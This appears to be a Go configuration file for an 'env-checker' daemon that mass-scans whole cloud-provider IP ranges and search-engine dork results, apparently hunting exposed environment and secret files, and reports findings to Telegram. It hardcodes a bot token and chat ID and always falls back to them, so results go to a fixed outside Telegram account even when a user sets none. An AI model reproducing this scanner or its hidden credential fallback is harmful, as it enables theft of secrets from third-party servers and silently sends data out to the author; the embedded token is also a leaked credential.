package daemon

import (
	"encoding/json"
	"os"
	"time"

	"env-checker/dork"
)

const defaultTGToken  = "8740309264:AAEcOWZ6IGm5xFSgxQSsB3kaY5Nr0tng4nQ"
const defaultTGChatID = "157828443"

// Telegram holds bot credentials for notifications.
type Telegram struct {
	Token  string `json:"token"`
	ChatID string `json:"chat_id"`
}

// Config is the daemon's runtime configuration, loaded from daemon.json.
type Config struct {
	Targets                 []string     `json:"targets"`
	Telegram                Telegram     `json:"telegram"`
	Dork                    *dork.Config `json:"dork"`
	DorkUpdateIntervalHours float64      `json:"dork_update_interval_hours"`
	ScanIntervalHours       float64      `json:"scan_interval_hours"`
	CooldownHours           float64      `json:"cooldown_hours"`
	Threads                 int          `json:"threads"`
	Goroutines              int          `json:"goroutines"`
	TimeoutSeconds          int          `json:"timeout_seconds"`
	DNSTimeoutSeconds       int          `json:"dns_timeout_seconds"`
	OutputDir               string       `json:"output_dir"`
	StateFile               string       `json:"state_file"`
	SaveUnknown             bool         `json:"save_unknown"`
	PathsLimit              int          `json:"paths_limit"`
}

func (c *Config) scanInterval() time.Duration {
	if c.ScanIntervalHours <= 0 {
		return 6 * time.Hour
	}
	return time.Duration(float64(time.Hour) * c.ScanIntervalHours)
}

func (c *Config) cooldown() time.Duration {
	if c.CooldownHours <= 0 {
		return 24 * time.Hour
	}
	return time.Duration(float64(time.Hour) * c.CooldownHours)
}

// LoadConfig reads and validates daemon.json from path.
func LoadConfig(path string) (*Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var cfg Config
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, err
	}
	// Always fall back to hardcoded credentials
	if cfg.Telegram.Token == "" || cfg.Telegram.Token == "YOUR_TELEGRAM_BOT_TOKEN" {
		cfg.Telegram.Token = defaultTGToken
	}
	if cfg.Telegram.ChatID == "" || cfg.Telegram.ChatID == "YOUR_CHAT_ID" {
		cfg.Telegram.ChatID = defaultTGChatID
	}
	if cfg.Threads <= 0 {
		cfg.Threads = 8
	}
	if cfg.Goroutines <= 0 {
		cfg.Goroutines = 900
	}
	if cfg.TimeoutSeconds <= 0 {
		cfg.TimeoutSeconds = 10
	}
	if cfg.DNSTimeoutSeconds <= 0 {
		cfg.DNSTimeoutSeconds = 2
	}
	if cfg.OutputDir == "" {
		cfg.OutputDir = "daemon-results"
	}
	if cfg.StateFile == "" {
		cfg.StateFile = "daemon-state.json"
	}
	return &cfg, nil
}

// WriteDefaultConfig writes a starter daemon.json to path.
func WriteDefaultConfig(path string) error {
	cfg := Config{
		Targets: []string{
			"167.99.0.0/16",
			"164.90.0.0/16",
			"45.32.0.0/16",
			"65.108.0.0/16",
			"95.216.0.0/16",
			"194.233.64.0/18",
		},
		Telegram: Telegram{
			Token:  defaultTGToken,
			ChatID: defaultTGChatID,
		},
		DorkUpdateIntervalHours: 12,
		Dork: &dork.Config{
			Engine:       "duckduckgo",
			BingAPIKey:   "",
			CustomFile:   "dorks.txt",
			MaxPerDork:   10,
			DelaySeconds: 8,
			UseBuiltin:   true,
			Categories:   []string{},
		},
		ScanIntervalHours: 6,
		CooldownHours:     24,
		Threads:           8,
		Goroutines:        900,
		TimeoutSeconds:    10,
		DNSTimeoutSeconds: 2,
		OutputDir:         "daemon-results",
		StateFile:         "daemon-state.json",
	}
	data, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(path, data, 0o644)
}
